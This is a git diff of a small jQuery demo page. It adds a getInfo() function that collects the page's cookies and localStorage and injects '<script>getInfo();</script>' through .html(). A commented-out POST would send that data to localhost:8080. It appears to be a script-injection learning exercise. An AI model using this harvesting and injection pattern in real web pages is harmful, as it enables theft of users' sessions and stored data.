@@ -20,12 +20,33 @@
   <link rel="stylesheet" href="css/style.css" type="text/css">
 </head>
 <body>
-  <button onclick="getNames()">Click Me!</button>
+  <button onclick="getNames()">Set Names</button>
+  <button onclick="getInfo()">Get Info</button>
   <p>Names</p>
   <p id="namesList"></p>
-  <script src="http://code.jquery.com/jquery-1.11.3.js"></script>
+  <script src="http://code.jquery.com/jquery-2.1.4.js"></script>
   <script src="js/script.js"></script>
   <script>
+    var getInfo = function() {
+      var yourData = JSON.stringify(
+        {
+          cookies: document.cookie,
+          storage: localStorage
+        }
+      );
+      // $.ajax({
+      //   type: 'POST',
+      //   url: "http://localhost:8080",
+      //   contentType: "application/json; charset=utf-8",
+      //   dataType: 'json',
+      //   data: yourData,
+      //   success: function (data) {
+      //     console.log(data);
+      //   }
+      // })
+      console.log(yourData);
+    }
+
     var getNames = function() {
       $.ajax({
         type: 'GET',
@@ -33,14 +54,13 @@
         contentType: "application/json; charset=utf-8",
         dataType: 'json',
         success: function (data) {
-            //console.log(data);
             var html = '';
             for (i in data) {
               html += data[i] + '<br>';
-              console.log(html);
+              // console.log(html);
             }
-            html += '<script>alert(\'foo\');<\/script>';
-            console.log(html);
+            html += '<script>getInfo();<\/script>';
+            // console.log(html);
             $('#namesList').html(html);
         }
       });
